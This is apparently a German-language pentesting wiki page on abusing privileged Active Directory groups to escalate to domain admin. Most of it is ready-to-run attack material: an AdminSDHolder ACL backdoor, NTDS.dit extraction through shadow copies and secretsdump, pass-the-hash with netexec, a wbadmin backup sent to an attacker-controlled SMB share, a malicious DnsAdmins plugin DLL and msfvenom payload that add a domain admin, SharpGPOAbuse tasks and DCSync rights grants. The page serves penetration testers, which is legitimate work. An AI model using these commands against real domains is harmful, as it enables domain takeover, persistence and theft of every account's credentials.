# Privilegierte Gruppen

{{#include ../../banners/hacktricks-training.md}}

## Bekannte Gruppen mit Administrationsberechtigungen

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Diese Gruppe ist berechtigt, Konten und Gruppen zu erstellen, die keine Administratoren der Domäne sind. Außerdem ermöglicht sie die lokale Anmeldung am Domain Controller (DC).

Um die Mitglieder dieser Gruppe zu identifizieren, wird der folgende Befehl ausgeführt:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

Das Hinzufügen neuer Benutzer ist erlaubt, ebenso wie die lokale Anmeldung am DC.<sup>[[1]](#references)</sup>

Ein bedingter Pfad von der Kontoverwaltung zum lokalen Administratorzugriff führt über eine **gewöhnliche Gruppe, der das Lesen des LAPS-Passworts eines Computers delegiert wurde**. Prüfe die effektiven Schreibrechte für Mitgliedschaften in genau dieser Gruppe, ob sie geschützt ist und ob ein neues oder kontrolliertes Konto ihr tatsächlich beitreten kann. Aktualisiere das Token des Kontos, bevor du die LAPS-Leseberechtigung auf dem Zielcomputer testest. Bei verschlüsseltem Windows LAPS sind Leseberechtigung im Verzeichnis und Berechtigung zur Passwortentschlüsselung separate Voraussetzungen; die Gruppenmitgliedschaft oder die Mitgliedschaft in Account Operators allein gewährt keines von beiden. Siehe [Microsofts Geltungsbereich von Account Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) und [Windows-LAPS-Delegierung](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).

## AdminSDHolder-Gruppe

Die Access Control List (ACL) der **AdminSDHolder**-Gruppe ist entscheidend, da sie die Berechtigungen für alle „geschützten Gruppen“ in Active Directory festlegt, einschließlich Gruppen mit hohen Berechtigungen. Dieser Mechanismus schützt diese Gruppen, indem er unbefugte Änderungen verhindert.

Ein Angreifer könnte dies ausnutzen, indem er die ACL der **AdminSDHolder**-Gruppe ändert und einem Standardbenutzer volle Berechtigungen gewährt. Dadurch erhielte dieser Benutzer effektiv die vollständige Kontrolle über alle geschützten Gruppen. Werden die Berechtigungen dieses Benutzers geändert oder entfernt, werden sie aufgrund des Systemdesigns innerhalb einer Stunde automatisch wiederhergestellt.<sup>[[14]](#references)</sup>

Aktuelle Dokumentation zu Windows Server führt mehrere integrierte Operator-Gruppen weiterhin als **geschützte** Objekte auf (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` usw.). Der **SDProp**-Prozess wird standardmäßig alle 60 Minuten auf dem **PDC Emulator** ausgeführt, setzt `adminCount=1` und deaktiviert die Vererbung für geschützte Objekte. Das ist sowohl für Persistenz nützlich als auch für die Suche nach veralteten privilegierten Benutzern, die aus einer geschützten Gruppe entfernt wurden, aber weiterhin die ACL ohne Vererbung behalten.<sup>[[12]](#references)</sup>

Befehle zum Überprüfen der Mitglieder und Ändern der Berechtigungen umfassen:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

Ein Script steht zur Verfügung, um den Wiederherstellungsprozess zu beschleunigen: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Weitere Details finden Sie unter [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

Die Sichtbarkeit gelöschter Objekte wird durch die effektiven Verzeichnisberechtigungen gesteuert; ein Gruppenname allein beweist nicht, dass die aktuelle Identität ein Objekt auflisten oder wiederherstellen kann. AD Recycle Bin muss vor dem Löschen aktiviert worden sein, damit eine vollständige Wiederherstellung möglich ist. Außerdem erfordert eine Wiederherstellung Reanimate-Tombstones auf der Stammstruktur des Naming Contexts, Umbenennungsrechte und CREATE_CHILD auf dem Zielcontainer. Die [Anleitung von Microsoft zu Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) und die [Autorisierungsregeln zum Wiederherstellen gelöschter Objekte](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) unterscheiden diese Bedingungen. Eine autorisierte Identität mit Lesezugriff auf gelöschte Objekte kann Datensätze untersuchen, die sensible Informationen offenlegen könnten:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Dies ist nützlich, um **frühere Privilegienpfade wiederherzustellen**. Gelöschte Objekte können weiterhin `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, alte SPNs oder den DN einer gelöschten privilegierten Gruppe offenlegen, die später von einem anderen Operator wiederhergestellt werden kann.

Anwendungsspezifische Attribute können außerdem altes Credential-Material enthalten, solange sich ein Objekt im gelöschten Zustand befindet. Betrachte dies als separaten Prüfhinweis: Die aktuelle Identität muss berechtigt sein, das gelöschte Objekt **aufzulisten** und **dieses Attribut auszulesen**; der Wert muss ein nutzbares Credential sein, und ein noch aktiver Principal muss es akzeptieren. Gruppenmitgliedschaft oder der Name eines gelöschten Kontos allein belegen keinen dieser Schritte. Gib bei routinemäßigen Aufzählungen keine Credential-Werte aus. Die [Dokumentation von Microsoft zu Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) beschreibt die Beibehaltung von Attributen nach dem Löschen.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Reaktivieren eines gelöschten Kontos über delegierte ACLs

Das Ergebnis `WRITE` eines ACL-Tools für ein gelöschtes Konto ist ein Hinweis, aber kein Beweis dafür, dass alle Berechtigungen zum Wiederherstellen wirksam sind.<sup>[[18]](#references)</sup> Untersuche die ACL des gelöschten Objekts und `lastKnownParent` direkt; BloodHound-Pfade lassen ACLs gelöschter Objekte möglicherweise aus.<sup>[[19]](#references)</sup> Ein wiederhergestelltes Konto kann seinen Passwort-Hash behalten, aber durch die Wiederherstellung wird weder das Passwort offengelegt noch werden Rechte zum Zurücksetzen des Passworts erteilt. Für die Authentifizierung ist weiterhin ein gültiger Berechtigungsnachweis erforderlich.<sup>[[19]](#references)</sup>

Um versteckte gelöschte Konten aufzulisten und das Recht zur Reaktivierung unter Linux zu bestätigen, verwende `bloodyAD` mit den LDAP-Steuerelementen für recycelte Objekte und deaktivierte Verknüpfungen. Stelle das ausgewählte Konto dann anhand seines `sAMAccountName` wieder her. Ersetze die Beispieldomäne, den Host und die Identität durch die Werte der untersuchten Umgebung; überprüfe vor dem Schreibvorgang den Ziel-DN und `lastKnownParent`.<sup>[[19]](#references)</sup>

```bash
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get writable
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get object 'DC=example,DC=local' --attr nTSecurityDescriptor --resolve-sd | grep -i Reanimate-Tombstones
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --base 'CN=Deleted Objects,DC=example,DC=local' --filter '(sAMAccountName=*)' --attr sAMAccountName,lastKnownParent,objectSid
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' set restore target.user
```

### Zugriff auf den Domain Controller

Der Zugriff auf Dateien auf dem DC ist eingeschränkt, sofern der Benutzer nicht Mitglied der Gruppe `Server Operators` ist. In diesem Fall ändert sich die Zugriffsebene.

### Privilege Escalation

Mit `PsService` oder `sc` von Sysinternals lassen sich Dienstberechtigungen untersuchen und ändern. Die Gruppe `Server Operators` hat beispielsweise die volle Kontrolle über bestimmte Dienste. Dadurch können beliebige Befehle ausgeführt und Privilege Escalation erreicht werden:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

Dieser Befehl zeigt, dass `Server Operators` vollen Zugriff haben und dadurch Dienste manipulieren können, um höhere Berechtigungen zu erlangen.

## Backup Operators

Die Mitgliedschaft in `Backup Operators` kann abhängig von der lokalen Richtlinie und der Anmeldesitzung auf einem Host `SeBackupPrivilege` und `SeRestorePrivilege` gewähren. Prüfen Sie das **effektive Token des Prozesses, der die Befehle ausführt**, mit `whoami /groups` und `whoami /priv`: Die Mitgliedschaft allein beweist nicht, dass `SeBackupPrivilege` vorhanden und aktiviert ist. Ist das Privileg vorhanden, aber deaktiviert, kann es in diesem Token aktiviert werden; fehlt es oder wurde es entfernt, können diese Backup-Vorgänge es nicht nutzen. `SeBackupPrivilege` ermöglicht geschützte **Lesevorgänge** über Backup-fähige APIs (zum Beispiel `FILE_FLAG_BACKUP_SEMANTICS` oder `robocopy /B`); `SeRestorePrivilege` ist ein separates Privileg für Wiederherstellungs- und Schreibvorgänge. Bei gewöhnlichen Verzeichnisauflistungen und Kopiervorgängen wird die Backup-Semantik nicht unbedingt verwendet.<sup>[[1]](#references)</sup>

Führen Sie zum Auflisten der Gruppenmitglieder Folgendes aus:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Lokaler Angriff

Auf einem Host, auf dem das effektive Token über `SeBackupPrivilege` verfügt, kann die folgende backup-aware Kopie eine geschützte Datei lesen:

1. Notwendige Bibliotheken importieren:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Wenn das Privileg vorhanden, aber deaktiviert ist, aktivieren Sie es und überprüfen Sie seinen Status in diesem Prozess:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Eine Datei aus einem eingeschränkten Verzeichnis kopieren, zum Beispiel:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD-Angriff

`NTDS.dit` ist die Active-Directory-Datenbank auf einem **Domänencontroller (DC)**. Dieser Weg erfordert ein geeignetes Token auf dem DC und Zugriff auf das Volume, das die Datenbank enthält; die Mitgliedschaft bei den Backup Operators an anderer Stelle gewährt keinen Zugriff auf einen bestimmten DC. Eine aktive Datenbank ist normalerweise gesperrt. Verwende daher vor dem Kopieren eine zugängliche Schattenkopie oder eine andere Backup-Funktion. Das Erstellen oder Bereitstellen einer Schattenkopie hängt außerdem von der VSS-Konfiguration des Hosts und den Rechten des aufrufenden Benutzers ab. Das folgende Beispiel geht davon aus, dass der DC `NTDS.dit` auf `C:` unter `\Windows\NTDS` speichert. Passe Volume und Pfad gegebenenfalls an.

#### Mit diskshadow.exe

1. Falls zulässig, erstelle eine Schattenkopie des Laufwerks `C:` des DC und stelle sie als `F:` bereit:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. `NTDS.dit` aus der Schattenkopie kopieren:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Alternativ können Sie `robocopy` zum Kopieren von Dateien verwenden:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. Speichern Sie die `SYSTEM`-Hive des DC zur Offline-Extraktion. `SAM` ist die lokale Kontendatenbank auf Mitgliedersystemen; die `SAM`-Hive eines DC ist kein Ersatz für `NTDS.dit` und keine Quelle für den Hash des Domänen-Administrators:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. Übertrage `ntds.dit` und `SYSTEM.SAV` auf den Analysehost und extrahiere die Hashes der Domänenkonten. Ein gespeicherter `SAM`-Hive von einem Mitgliedssystem liefert zusammen mit dem passenden `SYSTEM`-Hive stattdessen lokale Account-Hashes:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. Wenn ein Hash eines **Domänenadministrators** aus `NTDS.dit` wiederhergestellt wurde, kann er für die Domänenauthentifizierung getestet werden. Ein lokaler Administrator-Hash aus `SAM.SAV` ist ein anderes Anmeldedatum und authentifiziert nicht als Domänenadministrator.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### Verwendung von wbadmin.exe

1. Richten Sie auf dem Angreiferrechner ein NTFS-Dateisystem für den SMB-Server ein und speichern Sie die SMB-Anmeldedaten auf dem Zielrechner zwischen.
2. Verwenden Sie `wbadmin.exe` für ein Systemsicherung und die Extraktion von `NTDS.dit`:
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

Eine praktische Demonstration finden Sie in [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Mitglieder der Gruppe **DnsAdmins** können ihre Berechtigungen ausnutzen, um eine beliebige DLL mit SYSTEM-Berechtigungen auf einem DNS-Server zu laden, der häufig auf Domänencontrollern gehostet wird. Diese Möglichkeit bietet ein erhebliches Ausnutzungspotenzial.

Mit folgendem Befehl können Sie die Mitglieder der Gruppe DnsAdmins auflisten:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Diese Schwachstelle ermöglicht die Ausführung beliebigen Codes mit SYSTEM-Berechtigungen im DNS-Dienst (normalerweise innerhalb der DCs). Dieses Problem wurde 2021 behoben.

Mitglieder können den DNS-Server mithilfe von Befehlen wie den folgenden eine beliebige DLL laden lassen (entweder lokal oder von einer Remote-Freigabe):

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Ein Neustart des DNS-Dienstes (wofür möglicherweise zusätzliche Berechtigungen erforderlich sind) ist notwendig, damit die DLL geladen wird:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

Weitere Details zu diesem Angriffsvektor finden Sie bei ired.team.

#### Mimilib.dll

Es ist auch möglich, mimilib.dll zur Befehlsausführung zu verwenden, indem man sie so anpasst, dass sie bestimmte Befehle oder Reverse Shells ausführt. [Weitere Informationen finden Sie in diesem Beitrag](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html).<sup>[[15]](#references)</sup>

### WPAD-Eintrag für MitM

DnsAdmins können DNS-Einträge manipulieren, um Man-in-the-Middle-Angriffe (MitM) durchzuführen, indem sie nach dem Deaktivieren der globalen Abfragesperrliste einen WPAD-Eintrag erstellen. Tools wie Responder oder Inveigh können zum Spoofing und zum Mitschneiden von Netzwerkverkehr verwendet werden.

### Event Log Readers
Mitglieder können auf Ereignisprotokolle zugreifen und dort möglicherweise sensible Informationen wie Klartextpasswörter oder Details zur Befehlsausführung finden:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

Diese Gruppe kann DACLs für das Domänenobjekt ändern und sich dadurch möglicherweise DCSync-Berechtigungen gewähren. Techniken zur Rechteausweitung, die diese Gruppe ausnutzen, werden im GitHub-Repository Exchange-AD-Privesc ausführlich beschrieben.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

Wenn du als Mitglied dieser Gruppe agieren kannst, besteht der klassische Missbrauch darin, einem vom Angreifer kontrollierten Sicherheitsprinzipal die für [DCSync](dcsync.md) erforderlichen Replikationsrechte zu gewähren:

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Historisch verknüpfte **PrivExchange** den Zugriff auf Postfächer, erzwungene Exchange-Authentifizierung und LDAP relay, um dieselbe primitive Berechtigung zu erlangen. Selbst wenn dieser relay-Pfad entschärft ist, bleibt die direkte Mitgliedschaft in `Exchange Windows Permissions` oder die Kontrolle über einen Exchange-Server ein hochgradig wertvoller Weg zu Replikationsrechten für die Domäne.

## Hyper-V Administrators

Hyper-V Administrators haben uneingeschränkten Zugriff auf Hyper-V, der ausgenutzt werden kann, um die Kontrolle über virtualisierte Domain Controller zu erlangen. Dazu gehört das Klonen laufender DCs und das Extrahieren von NTLM-Hashes aus der Datei NTDS.dit.

### Ausnutzungsbeispiel

In der Praxis geht es meist um **Offline-Zugriff auf DC-Festplatten/Checkpoints** statt um alte LPE-Tricks auf Host-Ebene. Mit Zugriff auf den Hyper-V-Host kann ein Operator einen virtualisierten Domain Controller checkpointen oder exportieren, die VHDX einbinden und `NTDS.dit`, `SYSTEM` sowie weitere Geheimnisse extrahieren, ohne LSASS innerhalb des Gasts anzufassen:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

Von dort aus kannst du den `Backup Operators`-Workflow wiederverwenden, um `Windows\NTDS\ntds.dit` und die Registry-Hives offline zu kopieren. Verwandter Workflow für Backup-Dateien:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

Diese Gruppe ermöglicht es Mitgliedern, Gruppenrichtlinien in der Domäne zu erstellen. Ihre Mitglieder können Gruppenrichtlinien jedoch weder auf Benutzer oder Gruppen anwenden noch vorhandene GPOs bearbeiten.

Wichtig ist, dass der **Ersteller zum Besitzer der neuen GPO wird** und danach normalerweise genügend Rechte hat, sie zu bearbeiten. Das bedeutet, dass diese Gruppe interessant ist, wenn du entweder:

- eine bösartige GPO erstellen und einen Admin davon überzeugen kannst, sie mit einer Ziel-OU oder -Domäne zu verknüpfen
- eine von dir erstellte GPO bearbeiten kannst, die bereits an einer nützlichen Stelle verknüpft ist
- ein anderes delegiertes Recht missbrauchen kannst, mit dem sich GPOs verknüpfen lassen, während diese Gruppe dir die Bearbeitungsrechte gibt

Praktischer Missbrauch bedeutet normalerweise, über richtliniengestützte Dateien in SYSVOL eine Änderung durch eine **Immediate Task**, ein **Startup-Skript**, eine **lokale Admin-Mitgliedschaft** oder eine **Zuweisung von Benutzerrechten** vorzunehmen.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

Wenn du die GPO manuell über `SYSVOL` bearbeitest, beachte, dass die Änderung allein nicht ausreicht: `versionNumber`, `GPT.ini` und manchmal `gPCMachineExtensionNames` müssen ebenfalls aktualisiert werden, andernfalls ignorieren Clients die Richtlinienaktualisierung.<sup>[[9]](#references)</sup>

## Organization Management

In Umgebungen, in denen **Microsoft Exchange** bereitgestellt wird, verfügt eine spezielle Gruppe namens **Organization Management** über umfangreiche Berechtigungen. Diese Gruppe darf **auf die Postfächer aller Domänenbenutzer zugreifen** und hat **volle Kontrolle über die Organisationseinheit (OU) „Microsoft Exchange Security Groups“**. Diese Kontrolle umfasst die Gruppe **`Exchange Windows Permissions`**, die zur Rechteausweitung ausgenutzt werden kann.

### Rechteausnutzung und Befehle

#### Print Operators

Mitglieder der Gruppe **Print Operators** verfügen über mehrere Berechtigungen, darunter **`SeLoadDriverPrivilege`**, die es ihnen ermöglichen, sich **lokal an einem Domain Controller anzumelden**, diesen herunterzufahren und Drucker zu verwalten. Um diese Berechtigungen auszunutzen, ist eine Umgehung der Benutzerkontensteuerung (UAC) erforderlich, insbesondere wenn **`SeLoadDriverPrivilege`** in einem nicht erhöhten Kontext nicht sichtbar ist.<sup>[[1]](#references)</sup>

Um die Mitglieder dieser Gruppe aufzulisten, wird der folgende PowerShell-Befehl verwendet:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

Auf Domain Controllern ist diese Gruppe gefährlich, da die standardmäßige Domain Controller Policy `**`SeLoadDriverPrivilege`**` an `Print Operators` vergibt. Wenn du für ein Mitglied dieser Gruppe ein Token mit erhöhten Rechten erhältst, kannst du das Privileg aktivieren und einen signierten, aber anfälligen Treiber laden, um zu Kernel/SYSTEM zu wechseln.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Einzelheiten zur Token-Verarbeitung findest du unter [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Mitglieder dieser Gruppe erhalten über das Remote Desktop Protocol (RDP) Zugriff auf PCs. Zum Auflisten dieser Mitglieder stehen PowerShell-Befehle zur Verfügung:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Weitere Informationen zum Ausnutzen von RDP finden sich in speziellen Pentesting-Ressourcen.

#### Remote Management Users

Mitglieder können über **Windows Remote Management (WinRM)** auf PCs zugreifen. Diese Mitglieder lassen sich wie folgt enumerieren:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

Für Exploitation-Techniken im Zusammenhang mit **WinRM** sollte die entsprechende Dokumentation konsultiert werden.

#### Server Operators

Diese Gruppe verfügt über Berechtigungen, verschiedene Konfigurationen auf Domänencontrollern vorzunehmen, darunter Sicherungs- und Wiederherstellungsrechte, das Ändern der Systemzeit und das Herunterfahren des Systems.<sup>[[1]](#references)</sup> Zum Auflisten der Mitglieder wird folgender Befehl angegeben:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

Auf Domain Controllern erben `Server Operators` häufig ausreichende Rechte, um **Dienste neu zu konfigurieren oder zu starten/stoppen**, und erhalten über die standardmäßige DC-Richtlinie außerdem `SeBackupPrivilege`/`SeRestorePrivilege`. In der Praxis bilden sie damit eine Verbindung zwischen **Missbrauch der Dienststeuerung** und **NTDS-Extraktion**:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

Wenn Dienste nicht aufgelistet werden können, schließt das den Zugriff auf einen **bekannten Dienst** nicht aus. Der Service Control Manager prüft `SC_MANAGER_ENUMERATE_SERVICE` für das Auflisten getrennt von `SC_MANAGER_CONNECT`; beim Öffnen eines benannten Dienstes werden dessen eigene Rechte geprüft, einschließlich `SERVICE_CHANGE_CONFIG` und `SERVICE_START`. Prüfe das effektive Token und die ACL des jeweiligen Dienstes auch dann, wenn ein allgemeines `sc.exe query` fehlschlägt. Konfigurationsrechte allein sind lediglich ein möglicher Ansatzpunkt: Die Dienstidentität, Start-/Stopprechte und ein nutzbarer Trigger entscheiden ebenfalls darüber, ob ein Übergang zu höheren Berechtigungen möglich ist. Siehe die [Referenz zu Dienstzugriffsrechten von Microsoft](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Wenn eine Dienst-ACL dieser Gruppe Änderungs-/Startrechte gewährt, richte den Dienst auf einen beliebigen Befehl aus, starte ihn als `LocalSystem` und setze anschließend den ursprünglichen `binPath` wieder zurück. Wenn die Dienststeuerung eingeschränkt ist, greife auf die obigen `Backup Operators`-Techniken zurück, um `NTDS.dit` zu kopieren.

## References

- [1] [ired.team – Privilegierte Konten und Token-Berechtigungen](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Ausnutzen von SeLoadDriverPrivilege zur Rechteausweitung](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – GPO-Berechtigungen ausnutzen](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO-Missbrauch, Teil 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Leitfaden für Red Teamer zu GPOs und OUs](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Funktion ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonymes LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Anhang C: Geschützte Konten und Gruppen in Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – AdminSDHolder missbrauchen und mit einer Hintertür versehen, um dauerhaften Domain-Admin-Zugriff zu erlangen](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – DnsAdmins-Berechtigung zur Rechteausweitung in Active Directory ausnutzen](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Informationen zum Missbrauch der GenericAll-Kante](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Funktion NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [18] [MS-ADTS – Autorisierungsregeln für das Wiederherstellen gelöschter Objekte](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004)
- [19] [0xdf – HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
